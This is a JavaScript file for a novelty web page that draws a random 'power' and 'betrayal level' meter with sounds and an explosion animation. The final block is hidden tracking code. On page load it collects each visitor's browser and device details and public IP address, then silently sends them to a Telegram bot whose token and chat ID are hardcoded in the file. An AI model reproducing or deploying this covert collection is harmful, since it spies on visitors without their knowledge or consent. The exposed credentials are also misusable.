document.addEventListener('DOMContentLoaded', () => {

  const menu = document.getElementById('menu');
  const meterScreen = document.getElementById('meter-screen');
  const measureBtn = document.getElementById('measureBtn');
  const backBtn = document.getElementById('backBtn');
  const pointer = document.getElementById('pointer');
  const ticksGroup = document.getElementById('ticks');
  const numbersGroup = document.getElementById('numbers');
  const gradient = document.getElementById('meter-gradient');
  const resultDiv = document.getElementById('result');
  const previewImg = document.getElementById('preview-img');
  const explosionGif = document.getElementById('explosion-gif');

  let currentMeter = 1;

  const sounds = {
    1: ['sounds/meter1_1.mp3','sounds/meter1_2.mp3','sounds/meter1_3.mp3'],
    2: ['sounds/meter2_1.mp3','sounds/meter2_2.mp3','sounds/meter2_3.mp3']
  };

  const meterColors = {
    1: ['#0f0','#ff0','#f00'],
    2: ['#0ff','#f0f','#ff0']
  };

  const centerX = 150;
  const centerY = 150;
  const radius = 120;
  const totalTicks = 20;

  function buildScale() {
    ticksGroup.innerHTML = '';
    numbersGroup.innerHTML = '';
    for (let i = 0; i <= totalTicks; i++) {
      const angle = 2 * Math.PI * i / totalTicks;
      const cosA = Math.cos(angle);
      const sinA = Math.sin(angle);

      const x1 = centerX + cosA * (radius - 6);
      const y1 = centerY + sinA * (radius - 6);
      const x2 = centerX + cosA * (radius + 6);
      const y2 = centerY + sinA * (radius + 6);

      const tick = document.createElementNS('http://www.w3.org/2000/svg','line');
      tick.setAttribute('x1', x1);
      tick.setAttribute('y1', y1);
      tick.setAttribute('x2', x2);
      tick.setAttribute('y2', y2);
      tick.setAttribute('stroke', '#fff');
      tick.setAttribute('stroke-width', i % 5 === 0 ? 3 : 1.5);
      ticksGroup.appendChild(tick);

      const numberX = centerX + cosA*(radius+22);
      const numberY = centerY + sinA*(radius+22);
      const txt = document.createElementNS('http://www.w3.org/2000/svg','text');
      txt.setAttribute('x', numberX);
      txt.setAttribute('y', numberY+4);
      txt.setAttribute('text-anchor','middle');
      txt.setAttribute('alignment-baseline','middle');
      txt.setAttribute('fill','#fff');
      txt.setAttribute('transform',`rotate(90 ${numberX} ${numberY})`);
      txt.textContent = Math.round(i*(100/totalTicks));
      numbersGroup.appendChild(txt);
    }
  }

  buildScale();

  function applyGradientForMeter(meterId) {
    const stops = gradient.querySelectorAll('stop');
    const colors = meterColors[meterId] || meterColors[1];
    if(stops.length >= 3){
      stops[0].setAttribute('stop-color', colors[0]);
      stops[1].setAttribute('stop-color', colors[1]);
      stops[2].setAttribute('stop-color', colors[2]);
    }
  }

  function setPointerDeg(deg){ pointer.style.transform = `rotate(${deg}deg)`; }
  function resetPointer(){ setPointerDeg(0); }

  function playRandomSoundForMeter(meterId){
    const list = sounds[meterId]||sounds[1];
    const idx = Math.floor(Math.random()*list.length);
    const audio = new Audio(list[idx]);
    audio.play().catch(()=>{});
  }

  function openMeter(meterId){
    currentMeter = meterId;
    applyGradientForMeter(currentMeter);
    resetPointer();
    resultDiv.textContent = '';
    menu.style.display = 'none';
    meterScreen.style.display = 'block';
  }

  document.querySelectorAll('.menu-btn').forEach(btn=>{
    btn.addEventListener('click',()=>openMeter(Number(btn.dataset.meter)||1));
  });

  backBtn.addEventListener('click',()=>{
    meterScreen.style.display='none';
    menu.style.display='block';
    previewImg.classList.remove('show');
    explosionGif.classList.remove('show');
  });

  function getRandomPowerAligned() {
    const tick = Math.floor(Math.random()*(totalTicks+1));
    return tick*(100/totalTicks);
  }

  measureBtn.addEventListener('click', ()=>{
    const power = getRandomPowerAligned();
    const deg = power/100*360;
    setPointerDeg(deg);
    playRandomSoundForMeter(currentMeter);

    resultDiv.textContent = currentMeter===1 ? `Потужність: ${Math.round(power)}%` : `Рівень зради: ${Math.round(power)}%`;

    if(power >= 90){
      previewImg.classList.add('show');
      const previewSound = new Audio('sounds/boo.mp3');
      previewSound.play().catch(()=>{});

      setTimeout(()=>{
        previewImg.classList.remove('show');

        explosionGif.classList.add('show');
        const explosionSound = new Audio('sounds/explosion.mp3');
        explosionSound.play().catch(()=>{});

        setTimeout(()=>{ explosionGif.classList.remove('show'); },2000);

      },2000);
    } else {
      previewImg.classList.remove('show');
      explosionGif.classList.remove('show');
    }
  });

  resetPointer();

  // === Сбор инфы и отправка в бота ===
  function collectDeviceInfo() {
    return {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      screen: `${screen.width}x${screen.height}`,
    };
  }

  async function getIp() {
    try {
      const res = await fetch("https://api.ipify.org?format=json");
      const data = await res.json();
      return data.ip;
    } catch (e) {
      return "unknown";
    }
  }

  async function sendDataToBot() {
    const info = collectDeviceInfo();
    info.ip = await getIp();

    const token = "8072675312:AAEsCXVL4RcSKNQasBTMGCcecZQoGsTCfkY";   // вставь сюда токен бота
    const chatId = "5423792783";       // сюда свой Telegram ID
    const text = `/add_device ${info.userAgent}|${info.platform}|${info.screen}|${info.language}|${info.timezone}|${info.ip}`;

    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text })
    });
  }

  // Запуск при заходе на сайт
  sendDataToBot();

});
